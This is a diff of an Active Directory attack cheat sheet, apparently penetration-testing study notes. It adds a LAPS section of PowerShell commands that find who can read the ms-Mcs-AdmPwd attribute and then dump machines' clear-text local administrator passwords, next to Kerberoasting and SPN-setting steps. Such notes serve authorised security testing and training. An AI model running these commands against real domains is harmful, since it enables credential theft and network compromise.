@@ -80,13 +80,36 @@ Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<SA
 
 #### Set SPN for the user
 - Must be unique accross the forest. 
-- Format <STRING>/<STRING>
+- Format ```<STRING>/<STRING>```
 ```
 . ./PowerView_dev.ps1
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’<ops/whatever1>’}
 ```
 
 #### Then Kerberoast user
+
+## LAPS
+- Local Administrator Password Solution (LAPS)
+- On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the C:\Program Files\LAPS\CSE directory.
+
+#### Find all users who can read passwords in clear test machines in OU's
+```
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
+```
+
+```
+Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
+Find-AdmPwdExtendedRights -Identity OUDistinguishedName
+```
+
+#### Read clear-text passwords:
+```
+Get-ADObject -SamAccountName <MACHINE NAME$> | select -ExpandProperty ms-mcs-admpwd
+```
+
+```
+Get-AdmPwdPassword -ComputerName <MACHINE NAME>
+```
 
 ## AS-REP Roasting
 #### Enumerating accounts with kerberos preauth disabled
